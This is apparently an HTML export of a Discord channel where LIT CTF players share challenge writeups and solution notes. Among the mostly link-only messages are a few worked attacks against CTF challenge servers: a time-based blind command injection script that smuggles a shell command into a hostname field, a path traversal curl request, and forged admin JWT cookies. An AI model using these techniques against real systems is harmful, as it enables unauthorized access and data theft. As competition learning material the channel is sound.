@@ -1,0 +1,1617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/lit25/writeups_866529872737075221.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-08-31T11:08:26.957000+00:00</span>
+      <div class="content"><a href="https://mindcrafters.xyz/writeups/litctf2025-revgame-kaizobrackeys/" target="_blank">https://mindcrafters.xyz/writeups/litctf2025-revgame-kaizobrackeys/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-30T15:33:53.434000+00:00</span>
+      <div class="content">crypto/im lagging
+
+<a href="https://zwique.gitbook.io/zwique_notes/writeups/random-ctf-writeup/im-lagging" target="_blank">https://zwique.gitbook.io/zwique_notes/writeups/random-ctf-writeup/im-lagging</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-28T16:17:03.055000+00:00</span>
+      <div class="content"><a href="https://github.com/UvuvDev/CTF_Writeups" target="_blank">https://github.com/UvuvDev/CTF_Writeups</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-28T08:46:20.070000+00:00</span>
+      <div class="content">Some pwn writeups 
+
+<a href="https://hyder.n0va.in/posts/lit_ctf/blog/#l1tx00n3wsaaaaaaappn" target="_blank">https://hyder.n0va.in/posts/lit_ctf/blog/#l1tx00n3wsaaaaaaappn</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-27T19:31:54.411000+00:00</span>
+      <div class="content">Detailed solution for web/my-first-website:
+<a href="https://github.com/S450R1/lit-ctf-writeups/tree/main/web/my-first-website" target="_blank">https://github.com/S450R1/lit-ctf-writeups/tree/main/web/my-first-website</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-27T08:39:25.105000+00:00</span>
+      <div class="content"><a href="https://dub.sh/SKBJaa6" target="_blank">https://dub.sh/SKBJaa6</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-27T03:25:54.987000+00:00</span>
+      <div class="content">Writeup for `rev/mergesort`:
+
+First of all, I couldn't read the decompiled code, so I asked chatgpt to translate it.
+
+<a href="https://chatgpt.com/share/68ae7956-b0d0-8007-bba3-e83f2376ee61" target="_blank">https://chatgpt.com/share/68ae7956-b0d0-8007-bba3-e83f2376ee61</a> (you should read this unless you already understood the code)
+
+The time is given in `out.txt`, so you know the initial array  `md` (and `data` , but we don't need it). From the code, we can tell that the twisted mergesort only splits if depth &lt;= 3; hence there are at most 16 leaves in the imaginary divide and conquer tree. 
+
+The only other observation that you need is that the twisted mergesort splits like this:
+```cpp
+const unsigned d = static_cast&lt;unsigned&gt;(seed % 9ULL) + 1U; // 1..9
+    const size_t mid = lo + (d * len) / 10 - 1;                 // may be near 10%,20%,...90%
+    seed /= 9ULL;                                               // consume digit
+```
+
+What is `md`? The first `15` entries are the sizes of each leaf from left to right; the rest of the entries are garbage. Knowing the size of all leaves is enough to determine all 15 splits, which is enough to determine all digits of the seed (in base 9).</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-27T00:41:29.170000+00:00</span>
+      <div class="content">Detailed writeup for web/group chat2
+
+<a href="https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md" target="_blank">https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat2/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-26T22:15:18.234000+00:00</span>
+      <div class="content">Detailed writeup for web/group chat
+
+<a href="https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md" target="_blank">https://github.com/S450R1/lit-ctf-writeups/blob/main/web/group-chat/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-26T20:10:00.725000+00:00</span>
+      <div class="content">not completed but yeah started.
+<a href="https://maay.gitbook.io/blogs/litctf-2025" target="_blank">https://maay.gitbook.io/blogs/litctf-2025</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-26T09:01:51.883000+00:00</span>
+      <div class="content"><a href="https://github.com/50ulR3ap3r/LITCTF" target="_blank">https://github.com/50ulR3ap3r/LITCTF</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-25T17:10:05.632000+00:00</span>
+      <div class="content"><a href="https://medium.com/@enderSSSSS/lexington-infomatics-tournament-ctf-2025-writeup-0e3821dd1da9" target="_blank">https://medium.com/@enderSSSSS/lexington-infomatics-tournament-ctf-2025-writeup-0e3821dd1da9</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-25T15:44:23.929000+00:00</span>
+      <div class="content"><a href="https://raadalzyoud.github.io/posts/LIT-CTF-2025/" target="_blank">https://raadalzyoud.github.io/posts/LIT-CTF-2025/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-25T15:38:49.516000+00:00</span>
+      <div class="content">## **pwn/the mound**
+<a href="https://strangek.vercel.app/blog/writeups/litctf/pwn/mound" target="_blank">https://strangek.vercel.app/blog/writeups/litctf/pwn/mound</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-15T21:26:17.356000+00:00</span>
+      <div class="content"><a href="https://youtu.be/OFgmVrguXok" target="_blank">https://youtu.be/OFgmVrguXok</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-15T18:25:52.211000+00:00</span>
+      <div class="content"><a href="https://abuctf.github.io/posts/LITCTF/" target="_blank">https://abuctf.github.io/posts/LITCTF/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-15T05:40:26.212000+00:00</span>
+      <div class="content">&lt;<a href="https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-8%20(65001)')Encode_text('UTF-16LE%20(1200)')ROT47(24)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx08'%7D,'',true,false,true,false)&amp;input=4KC04KCx4KC84KCr4KC84KCu4KGj4KGL4KGN4KCo4KGb4KGN4KGa4KGH4KGb4KCp4KGU4KGJ4KGM4KGl&gt;" target="_blank">https://gchq.github.io/CyberChef/#recipe=Decode_text('UTF-8%20(65001)')Encode_text('UTF-16LE%20(1200)')ROT47(24)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx08'%7D,'',true,false,true,false)&amp;input=4KC04KCx4KC84KCr4KC84KCu4KGj4KGL4KGN4KCo4KGb4KGN4KGa4KGH4KGb4KCp4KGU4KGJ4KGM4KGl&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T23:59:00.109000+00:00</span>
+      <div class="content">[dead](<a href="https://cdn.discordapp.com/emojis/1258524309287075910.webp?size=48&amp;quality=lossless&amp;name=dead)" target="_blank">https://cdn.discordapp.com/emojis/1258524309287075910.webp?size=48&amp;quality=lossless&amp;name=dead)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T23:58:33.638000+00:00</span>
+      <div class="content"><a href="https://github.com/EnchLolz/LITCTF-24" target="_blank">https://github.com/EnchLolz/LITCTF-24</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T20:48:54.179000+00:00</span>
+      <div class="content">- [Tomcroppery](<a href="https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/a%20little%20bit%20of%20tomcroppery/a_little_bit_of_tomcroppery.md)" target="_blank">https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/a%20little%20bit%20of%20tomcroppery/a_little_bit_of_tomcroppery.md)</a>
+
+- [pope-shuffle](<a href="https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/pope%20shuffle/pope_shuffle.md)" target="_blank">https://github.com/xtasy94/CTFW/blob/main/LIT%20CTF/pope%20shuffle/pope_shuffle.md)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T20:42:30.743000+00:00</span>
+      <div class="content"><a href="https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/LIT%20arcade/README.md" target="_blank">https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/LIT%20arcade/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T18:58:07.782000+00:00</span>
+      <div class="content">my writeups for web category
+
+1.  [anti-inspect](<a href="https://hxuu.github.io/blog/ctf/lit24/anti-inspect/)" target="_blank">https://hxuu.github.io/blog/ctf/lit24/anti-inspect/)</a>
+2. [jwt-1](<a href="https://hxuu.github.io/blog/ctf/lit24/jwt-1/)" target="_blank">https://hxuu.github.io/blog/ctf/lit24/jwt-1/)</a>
+3. [jwt-2](<a href="https://hxuu.github.io/blog/ctf/lit24/jwt-2/)" target="_blank">https://hxuu.github.io/blog/ctf/lit24/jwt-2/)</a>
+4. [traversed](<a href="https://hxuu.github.io/blog/ctf/lit24/traversed/)" target="_blank">https://hxuu.github.io/blog/ctf/lit24/traversed/)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T16:34:14.204000+00:00</span>
+      <div class="content">crazy writeup
+&gt; **Solution**: Please find the python solution file: [scrainbow_solution.py](<a href="https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow_solution.py)" target="_blank">https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow_solution.py)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T16:31:40.620000+00:00</span>
+      <div class="content">scrainbow writeup :
+<a href="https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow.md" target="_blank">https://github.com/hbsmmsbh/ctf-writeup/blob/main/Lexington%20Informatics%20Tournament%20CTF/2024/web/scrainbow.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T16:01:44.709000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/738848412912451695/1271915534392496179/1272946091087761480" target="_blank">https://discord.com/channels/738848412912451695/1271915534392496179/1272946091087761480</a> take a look</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T14:09:39.160000+00:00</span>
+      <div class="content">&lt;<a href="https://github.com/Moreplavec64/ctf-writeups/blob/main/litctf-2024/rev/revsite2/writeup.md&gt;" target="_blank">https://github.com/Moreplavec64/ctf-writeups/blob/main/litctf-2024/rev/revsite2/writeup.md&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T13:00:11.801000+00:00</span>
+      <div class="content"><a href="https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/How%20to%20Raise%20a%20Boring%20Vuln%20Flat/README.md" target="_blank">https://github.com/Lobsterge/CTF-Writeups/blob/main/LIT%20CTF%202024/How%20to%20Raise%20a%20Boring%20Vuln%20Flat/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T09:52:53.919000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/738848412912451695/1271915534392496179/1272855214386581545" target="_blank">https://discord.com/channels/738848412912451695/1271915534392496179/1272855214386581545</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T09:37:52.756000+00:00</span>
+      <div class="content">here you go 
+<a href="https://github.com/Team-Kirby/litctf-2024-writeups/tree/main/web/scrainbow" target="_blank">https://github.com/Team-Kirby/litctf-2024-writeups/tree/main/web/scrainbow</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T07:46:32.478000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/738848412912451695/1271915534392496179/1272777233638883350" target="_blank">https://discord.com/channels/738848412912451695/1271915534392496179/1272777233638883350</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T07:41:04.492000+00:00</span>
+      <div class="content">Solutions for Web challenges (5/6)
+
+    1. anti-inspect
+        `curl <a href="http://litctf.org:31779/`" target="_blank">http://litctf.org:31779/`</a> 
+        We can find flag in the variable flag value.
+        Flag is `LITCTF{your_fOund_teh_fI@g_94932}`
+    
+    2. traversed
+        We can traversal by using `curl` command and `--path-as-is` option. Do not forget to add `?` . `curl <a href="http://litctf.org:31778/?../../../flag.txt" target="_blank">http://litctf.org:31778/?../../../flag.txt</a> --path-as-is` .
+        
+    3. jwt-1
+        Get cookie `token` and edit at jwt.io and change admin value to true.
+        `curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRiYzEyMyIsImFkbWluIjp0cnVlfQ.tqNm1v5blWB0xJp3yOK73xa-ux6F7stX4yMGcOcmsL0' <a href="http://litctf.org:31781/flag`" target="_blank">http://litctf.org:31781/flag`</a>
+        
+    4. jwt-2
+        in index.ts file, update line 108 as `const token = sign({ name: username, admin: true });`. Start express server and create an account and get token. Then, use this token as cookie for <a href="http://litctf.org:31777/flag" target="_blank">http://litctf.org:31777/flag</a> to get the flag.
+    `curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWFhIiwiYWRtaW4iOnRydWV9.uNFPJ%2BUcCaa4uzBYuZdHshZtWTKgz9RXctBCjkckMOs' <a href="http://litctf.org:31777/flag`" target="_blank">http://litctf.org:31777/flag`</a>
+    
+    5. kirbytime
+        `curl -X POST -d 'password=kBySlaY' <a href="http://34.31.154.223:55601/`" target="_blank">http://34.31.154.223:55601/`</a> so the flag is LITCTF{kBySlaY} . I created bash script to get this correct password.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:42:17.027000+00:00</span>
+      <div class="content"><a href="https://github.com/wLUOw/CTF_Writeups/tree/master/LIT_CTF_2024" target="_blank">https://github.com/wLUOw/CTF_Writeups/tree/master/LIT_CTF_2024</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:22:48.323000+00:00</span>
+      <div class="content">Crypto Writeups
+<a href="https://thr34dr1pp3r.gitbook.io/ctf/litctf-2024" target="_blank">https://thr34dr1pp3r.gitbook.io/ctf/litctf-2024</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:12:25.205000+00:00</span>
+      <div class="content"><a href="https://hostileninja72.github.io/litcrypto/" target="_blank">https://hostileninja72.github.io/litcrypto/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:09:10.672000+00:00</span>
+      <div class="content"><a href="https://liminova.github.io/blog/litctf-2024-kuwahara" target="_blank">https://liminova.github.io/blog/litctf-2024-kuwahara</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:03:16.230000+00:00</span>
+      <div class="content"><a href="https://www.youtube.com/watch?v=KwTDsmyoMqg" target="_blank">https://www.youtube.com/watch?v=KwTDsmyoMqg</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-08-13T05:00:25.770000+00:00</span>
+      <div class="content"><a href="https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH" target="_blank">https://youtu.be/db7Md3IkVpQ?si=QDgbzXxmeivWkStH</a>
+
+Anyone want kablewy writeup vid?
+I record it but too lazy to editvand upload it to youtubue.  😅</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-21T05:49:32.739000+00:00</span>
+      <div class="content">blogs.mtdv.me/articles/ctfideas</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-21T00:56:13.632000+00:00</span>
+      <div class="content">After more deliberation by the organizers, we decide to create another category because of how unique a writeup is:
+
+- **Most Well-written and Unique writeup**: Crypto/YourDidIt! <a href="https://tinyurl.com/litctf23" target="_blank">https://tinyurl.com/litctf23</a> &lt;:goodjob:743848931133489185&gt; by &lt;@496804640860405772&gt; (or &lt;@965838357441675334&gt; honestly idk their usernames are the same)
+
+Congrats! Feel free to DM me for your prize too</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-21T00:44:49.272000+00:00</span>
+      <div class="content">In addition, here are the honorary mentions!
+
+- **Web**/Amogsus API: <a href="https://github.com/secyber/LITCTF23/blob/main/(web)%20amogsus-api.md" target="_blank">https://github.com/secyber/LITCTF23/blob/main/(web)%20amogsus-api.md</a> by &lt;@429654533921177623&gt; 
+- **Crypto**/The Door to the Xord: <a href="https://tinyurl.com/LlTCTF23" target="_blank">https://tinyurl.com/LlTCTF23</a> by &lt;@260642125551632384&gt; 
+- **Rev**/Budget MC: <a href="https://github.com/programmeruser2/ctf-solutions/tree/main/litctf/2023/budget-mc" target="_blank">https://github.com/programmeruser2/ctf-solutions/tree/main/litctf/2023/budget-mc</a> by &lt;@1045025377971609711&gt; 
+- **Misc**/wow its another pyjail: <a href="https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail" target="_blank">https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail</a> by &lt;@280925106685870082&gt; 
+
+Yall did an incredible job at writing writeups 🔥, and made it to the final selection round &lt;:goodjob:743848931133489185&gt;!</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-21T00:43:44.584000+00:00</span>
+      <div class="content">Congratulations to the following winners in each category! 🎉 
+
+- **Web**: Art Contest: <a href="https://blog.junron.dev/writeups/web/art-contest.html" target="_blank">https://blog.junron.dev/writeups/web/art-contest.html</a> by &lt;@585449672584331265&gt; 
+- **Crypto**: YourDidIt!: <a href="https://demo.hedgedoc.org/s/iourDE12Y" target="_blank">https://demo.hedgedoc.org/s/iourDE12Y</a> by &lt;@260642125551632384&gt;
+- **Rev**: Squish: <a href="https://github.com/cewau/ctf-writeups/blob/main/20230805-litctf/REV_squish.md" target="_blank">https://github.com/cewau/ctf-writeups/blob/main/20230805-litctf/REV_squish.md</a> by &lt;@662124171027021842&gt; 
+- **Pwn**: Stiller printf: <a href="https://eth007.me/blog/ctf/stiller-printf/" target="_blank">https://eth007.me/blog/ctf/stiller-printf/</a> by &lt;@669342948776738816&gt; 
+
+Please DM &lt;@829530293118697523&gt; or &lt;@835589688614060042&gt; your payment information to receive **$50 in cash** as your prize! 🥳 &lt;:goodjob:743848931133489185&gt;</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T20:43:25.762000+00:00</span>
+      <div class="content"><a href="https://codeforces.com/contest/1855/ratings/page/150?order=BY_RATING_CHANGE_DESC" target="_blank">https://codeforces.com/contest/1855/ratings/page/150?order=BY_RATING_CHANGE_DESC</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T06:50:08.649000+00:00</span>
+      <div class="content"><a href="https://codeforces.com/contest/1855/ratings/page/149?order=BY_RATING_CHANGE_DESC" target="_blank">https://codeforces.com/contest/1855/ratings/page/149?order=BY_RATING_CHANGE_DESC</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T06:47:58.578000+00:00</span>
+      <div class="content">the contest he prob got -71 on is <a href="https://codeforces.com/contest/1855/standings" target="_blank">https://codeforces.com/contest/1855/standings</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T06:39:13.851000+00:00</span>
+      <div class="content"><a href="https://www.reddit.com/r/askmath/comments/15k6yvm/i_was_given_this_by_my_friend_and_i_dont/" target="_blank">https://www.reddit.com/r/askmath/comments/15k6yvm/i_was_given_this_by_my_friend_and_i_dont/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T06:33:14.165000+00:00</span>
+      <div class="content">writeup for geoguessr: &lt;<a href="https://www.reddit.com/r/wherewasthistaken/comments/15j9apo/can_i_get_cords_for_this_bridge/&gt;" target="_blank">https://www.reddit.com/r/wherewasthistaken/comments/15j9apo/can_i_get_cords_for_this_bridge/&gt;</a>
+
+(this is not me please do not disqualify my team)</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-16T00:14:48.422000+00:00</span>
+      <div class="content">alright I went for it. here's Climbing Snowdon: <a href="https://tinyurl.com/LI4C4F23" target="_blank">https://tinyurl.com/LI4C4F23</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-15T00:28:55.013000+00:00</span>
+      <div class="content">writeup for crypto/door2xord: <a href="https://tinyurl.com/LlTCTF23" target="_blank">https://tinyurl.com/LlTCTF23</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-12T18:38:51.796000+00:00</span>
+      <div class="content"><a href="https://github.com/SuperBeetleGamer/Crypto-Writeups/tree/main/LITCTF%202023" target="_blank">https://github.com/SuperBeetleGamer/Crypto-Writeups/tree/main/LITCTF%202023</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-12T17:39:54.034000+00:00</span>
+      <div class="content"><a href="https://s3.hedgedoc.org/demo/uploads/af11e9b1-99b1-4df2-845e-9ac15be0eda9.png" target="_blank">https://s3.hedgedoc.org/demo/uploads/af11e9b1-99b1-4df2-845e-9ac15be0eda9.png</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-12T16:21:45.364000+00:00</span>
+      <div class="content">writeup for crypto/yourdidit: <a href="https://tinyurl.com/Iitctf23" target="_blank">https://tinyurl.com/Iitctf23</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-11T15:09:14.218000+00:00</span>
+      <div class="content"><a href="https://github.com/realrealAlexS/litctfwriteups/blob/main/icecream.md" target="_blank">https://github.com/realrealAlexS/litctfwriteups/blob/main/icecream.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-11T09:37:36.857000+00:00</span>
+      <div class="content">^just tried it again on <a href="http://litctf.org:31784/login.html" target="_blank">http://litctf.org:31784/login.html</a> and it works for me</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-10T05:09:53.192000+00:00</span>
+      <div class="content"><a href="https://github.com/4rr4y/ctf-writeups/blob/main/2023_LITCTF/README.md" target="_blank">https://github.com/4rr4y/ctf-writeups/blob/main/2023_LITCTF/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-10T02:47:48.155000+00:00</span>
+      <div class="content"><a href="https://github.com/EnchLolz/LITCTF23/blob/main/web/Ping_Pong_Under_Maintainance.md" target="_blank">https://github.com/EnchLolz/LITCTF23/blob/main/web/Ping_Pong_Under_Maintainance.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-09T19:34:26.114000+00:00</span>
+      <div class="content"><a href="https://github.com/secyber/LITCTF23/blob/main/(web)%20amogsus-api.md" target="_blank">https://github.com/secyber/LITCTF23/blob/main/(web)%20amogsus-api.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-09T19:03:54.028000+00:00</span>
+      <div class="content"><a href="https://eth007.me/blog/ctf/stiller-printf/" target="_blank">https://eth007.me/blog/ctf/stiller-printf/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-09T12:09:32.879000+00:00</span>
+      <div class="content">&lt;<a href="https://loevland.github.io/posts/litctf23/&gt;" target="_blank">https://loevland.github.io/posts/litctf23/&gt;</a>
+- Web (My boss left / unsecure / pingpong / amogsus-api)
+- Rev (rick / obfuscation)
+- Pwn (My pet canary's birthday pie / file reader?)
+- Misc (keving / amogus / blank and empty / kirbBot has a secret... )</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T21:06:38.685000+00:00</span>
+      <div class="content"><a href="https://forms.gle/gqX6fvB1NWMcT82V6" target="_blank">https://forms.gle/gqX6fvB1NWMcT82V6</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T19:29:55.247000+00:00</span>
+      <div class="content"><a href="https://nolliv22.com/categories/lit-ctf-2023/" target="_blank">https://nolliv22.com/categories/lit-ctf-2023/</a>
+polypoint
+incredible
+Ping Pong
+Ping Pong: Under Maintenance
+license-inject
+KirbBot has a secret...
+discord and more
+Blank and Empty
+amogsus-api
+unsecure
+rick
+obfuscation
+My boss left
+kevin
+HelloWorld
+amogus</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T19:10:43.870000+00:00</span>
+      <div class="content">For **crypto/polypoint**:
+<a href="https://maxniederman.com/posts/ctf/lit-2023/polypoint/" target="_blank">https://maxniederman.com/posts/ctf/lit-2023/polypoint/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T14:35:15.737000+00:00</span>
+      <div class="content">Here's the brief solution for Snowdon:
+1. Decode the given text from step 1 using the 'Hill cipher' (the hill in the problem is hinting at this) with matrix `{{1, 0}, {8, 5}}` (from the elevation of the mountain)
+2. Translate the text from Welsh to English (the mountain and hill both being in Wales is hinting at this)
+3. Unlock ZIP archive using password `RED KITE` (this should come from the decrypted text in step 1)
+4. Figure out that the decrypted text in step 1 is referring to 'polka dots'
+5. Decrypt step 2 using the polka dot cipher (<a href="https://www.cachesleuth.com/codes/dots.html)" target="_blank">https://www.cachesleuth.com/codes/dots.html)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T13:33:20.180000+00:00</span>
+      <div class="content">This might help
+<a href="https://javascript.info/prototypes" target="_blank">https://javascript.info/prototypes</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T13:25:03.319000+00:00</span>
+      <div class="content">I Think Yes, Someone Else Used Similar Approach
+<a href="https://discord.com/channels/738848412912451695/865613173859418153/1138460031663218718" target="_blank">https://discord.com/channels/738848412912451695/865613173859418153/1138460031663218718</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T13:03:05.126000+00:00</span>
+      <div class="content">Geoguessr &lt;@763303571700711425&gt; + &lt;@1067130782767910922&gt; :
+I'm French, living in the Caribbean, so the initial picture did not give me any hint at the first look: it’s blurry and I have no idea what the signs could refer to.
+
+However I have some initial information:
+-  Lexington School + the initial GPS coordinates given as an example are both around Boston
+- I looked at some gantries in this area and the frames were very similar.
+- The road was a 2 x 4 divided highway.
+
+My first thought was to search for all the gantries on openstreetmap then filter the list. But unfortunately, not all gantries were present.
+However, using openstreetmap, I was able to confirm that most roads were indeed tagged with the number of lanes and some with speed limits.
+
+Doing so, I started to note the road numbers, and noticed there was a road 287 and 87 that could be a match to the blurry signs on the picture. Therefore, I got to the intersection of those two roads and found that the details match even more. I moved down the road, and find a gantry that has all the features (display panel + several speed signs) and there you go:
+
+<a href="https://www.google.com/maps/@41.0764417,-73.9205859,3a,90y,180.79h,96.08t/data=!3m6!1e1!3m4!1srBpYPPUh0SWeEt8AP1zF9Q!2e0!7i16384!8i8192?entry=ttu" target="_blank">https://www.google.com/maps/@41.0764417,-73.9205859,3a,90y,180.79h,96.08t/data=!3m6!1e1!3m4!1srBpYPPUh0SWeEt8AP1zF9Q!2e0!7i16384!8i8192?entry=ttu</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T11:07:34.836000+00:00</span>
+      <div class="content">```py
+import requests, string, sys
+
+if len(sys.argv) == 1: URL = '<a href="http://localhost:8001'" target="_blank">http://localhost:8001'</a>
+else:                  URL = sys.argv[1]
+alphabet = string.ascii_letters + string.digits + '{}_!'
+payload = ';if grep -q "^%s" flag.txt; then sleep 1; fi;'
+
+flag = 'LITCTF{'
+while '}' not in flag:
+    for c in alphabet:
+        data = {'hostname': payload % (flag + c)}
+        resp = requests.post(URL, data=data)
+        if resp.elapsed.total_seconds() &gt; 1:
+            flag += c
+            break
+        print(f'{c=}\t{flag=}', end='\r')
+
+print()
+print(flag)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T10:34:12.457000+00:00</span>
